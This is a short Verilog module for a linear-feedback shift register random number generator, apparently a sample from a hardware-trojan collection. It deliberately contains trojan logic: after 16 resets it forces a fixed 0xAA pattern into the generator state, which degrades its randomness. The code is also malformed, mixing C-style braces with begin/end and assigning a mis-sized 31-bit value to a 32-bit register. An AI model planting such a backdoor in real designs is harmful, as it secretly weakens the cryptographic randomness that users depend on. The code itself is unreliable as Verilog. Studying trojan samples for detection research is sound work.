module random_with_supply_chain_trojan (
    
    // Inputs
    input                       i_clk,
    input                       i_reset_n,
    input               [31:0]  i_seed,

    // Outputs
    output reg          [7:0]  o_data
);

    /******** Reg declarations ********/
    reg [31:0]  r_data;
    wire        w_xnor;

    /******** Trojan specific declarations ********/
    reg [7:0]   reset_count = 0; // Counter for tracking the number of resets
    wire        trojan_activation_condition = (reset_count >= 8'h10); // Activates after 16 resets

    /******** Concurrent logic ********/
    assign w_xnor = (r_data[31] ^ ~r_data[29] ^ ~r_data[25] ^ ~r_data[24]);

    /******** Process ********/
    always @(posedge i_clk) begin
        if (!i_reset_n) begin
            r_data <= i_seed;
            reset_count <= reset_count + 1'b1; // Increment reset count on each reset
        end else {
            if (trojan_activation_condition) begin
                // After Trojan is activated, manipulate the RNG to degrade its randomness
                // For example, fix some bits in the output to reduce randomness
                r_data <= {r_data[30:8], 8'hAA}; // Inject a fixed pattern, reducing randomness
            } else {
                // Normal operation
                r_data <= {r_data[30:0], w_xnor};
            }
        end
        // Assign the output data
        o_data <= r_data[7:0];
    end

endmodule
